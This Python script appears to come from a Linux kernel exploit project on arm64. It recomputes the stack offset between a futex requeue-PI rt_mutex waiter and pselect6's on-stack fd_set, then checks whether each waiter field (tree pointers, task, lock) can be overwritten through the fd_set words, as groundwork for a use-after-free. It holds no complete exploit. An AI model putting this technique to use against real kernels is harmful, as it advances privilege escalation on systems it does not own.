#!/usr/bin/env python3
"""Recompute PSELECT_WAITER_WORD_SHIFT under CORRECTED GhostLock waiter layout.

Old script (S01 compute_pselect_shift.py) used futex_wait-embedded waiter → SHIFT=-46.
CORRECTED (PROCESS_LOG §47 / S05-07e): WAIT_REQUEUE_PI waiter lives in do_futex,
  not futex_wait:
    rt_mutex_init_waiter(x29 - 0xc8) @ do_futex
    task @ stack_top - 0x168
    waiter base = task - 0x30 = stack_top - 0x198

pselect fd_set still from core_sys_select (same as old script):
  pselect depth 0x260, stack_fds @ SP+0x50 → fdset_abs = -0x210

Assumptions (stack_top definition — must match both sides):
  * Absolute offsets are relative to the same kernel stack_top for successive
    syscalls on the same thread. Exception-entry frames cancel between paths.
  * Futex side includes __arm64_sys_futex frame (0x70) + do_futex only
    (no futex_wait). task @ -0x70 - 0xF8 = -0x168  [BIN §47].
  * Pselect side uses the *same* absolute origin: __arm64_sys_pselect6 +
    core_sys_select = 0x260, stack_fds at core_sys_select SP+0x50
    → fdset_abs = -0x210  (from compute_pselect_shift.py on this vmlinux).
  * Geometry reopen ≠ UAF success: still need EDEADLK + reclaim + consumer.

Usage (repo root or leaf5):
  uv run python leaf5/stages/S05-stack-overwrite/routes/10-ghostlock-true-uaf/analysis/recompute_pselect_shift_corrected.py
"""
from __future__ import annotations

# ── CORRECTED absolutes relative to kernel stack_top (exception entry cancels).
# Frame breakdown [BIN]:
#   __arm64_sys_futex  = 0x70
#   task relative to do_futex entry = -0xF8  (waiter @ x29-0xc8, task = waiter+0x30)
#   task_abs = -(0x70 + 0xF8) = -0x168
SYS_FUTEX_FRAME = 0x70
TASK_FROM_DO_FUTEX_ENTRY = 0xF8
TASK_ABS = -(SYS_FUTEX_FRAME + TASK_FROM_DO_FUTEX_ENTRY)  # -0x168
WAITER_TASK_OFF = 0x30
WAITER_BASE_ABS = TASK_ABS - WAITER_TASK_OFF  # -0x198

# From compute_pselect_shift.py on this vmlinux (pselect path unchanged):
#   __arm64_sys_pselect6 + core_sys_select = 0x260
#   stack_fds @ core_sys_select SP+0x50
PSELECT_TOTAL = 0x260
STACK_FDS_SP = 0x50
FDSET_ABS = -PSELECT_TOTAL + STACK_FDS_SP  # -0x210

# Cross-check: old futex_wait model (OBSOLETE for GhostLock):
#   futex_total = 0x3d0, waiter_sp = 0x50 → waiter_abs = -0x380
#   delta = -0x380 - (-0x210) = -368 → SHIFT = -46  (all fields OOR)

WAITER_FIELDS = [
    (0x00, 0, "tree_entry.__rb_parent_color"),
    (0x08, 1, "tree_entry.rb_right"),
    (0x10, 2, "tree_entry.rb_left"),
    (0x18, 3, "pi_tree_entry.__rb_parent_color"),
    (0x20, 4, "pi_tree_entry.rb_right"),
    (0x28, 5, "pi_tree_entry.rb_left"),
    (0x30, 6, "task"),
    (0x38, 7, "lock"),
]


def main() -> int:
    assert TASK_ABS == -0x168, f"task_abs mismatch: {TASK_ABS:#x}"
    assert WAITER_BASE_ABS == -0x198, f"waiter_base mismatch: {WAITER_BASE_ABS:#x}"
    assert FDSET_ABS == -0x210, f"fdset_abs mismatch: {FDSET_ABS:#x}"

    delta_bytes = WAITER_BASE_ABS - FDSET_ABS
    shift = delta_bytes // 8
    words_per_set = (640 + 63) // 64  # PSELECT_ROUTE_NFDS=640
    max_global = 3 * words_per_set - 1

    print("=== CORRECTED PSELECT_WAITER_WORD_SHIFT ===")
    print("  stack_top origin: same for futex/pselect (exception entry cancels)")
    print(f"  sys_futex frame:  {SYS_FUTEX_FRAME:#x}")
    print(f"  task from do_futex entry: -{TASK_FROM_DO_FUTEX_ENTRY:#x}")
    print(f"  task_abs:        {TASK_ABS:#x} ({TASK_ABS})")
    print(f"  waiter_base_abs: {WAITER_BASE_ABS:#x} ({WAITER_BASE_ABS})")
    print(f"  pselect_total:   {PSELECT_TOTAL:#x}  stack_fds_sp: {STACK_FDS_SP:#x}")
    print(f"  fdset_abs:       {FDSET_ABS:#x} ({FDSET_ABS})")
    print(f"  delta_bytes:     {delta_bytes} ({delta_bytes:#x})")
    print(f"  >>> SHIFT = {shift} <<<")
    print(f"  words_per_set={words_per_set} global=[0..{max_global}]")
    print()
    ok = 0
    for byte_off, word_off, name in WAITER_FIELDS:
        g = word_off + shift
        s, w = divmod(g, words_per_set)
        reachable = 0 <= s < 3
        if reachable:
            ok += 1
        mark = "OK" if reachable else "OOR"
        set_name = ["in", "out", "ex"][s] if reachable else f"set[{s}]"
        print(
            f"  +0x{byte_off:02x} w{word_off} -> global {g:3d} "
            f"{set_name}[{w}] {mark}  {name}"
        )
    print(f"\n  reachable fields: {ok}/{len(WAITER_FIELDS)}")
    if shift >= 0 and ok == len(WAITER_FIELDS):
        print("  GEOMETRY: all waiter fields in fd_set range (unlike SHIFT=-46).")
    print("  NOTE: geometry ≠ UAF; still need EDEADLK + reclaim + consumer.")
    print("  OLD (futex_wait model) SHIFT=-46 is OBSOLETE for GhostLock path.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
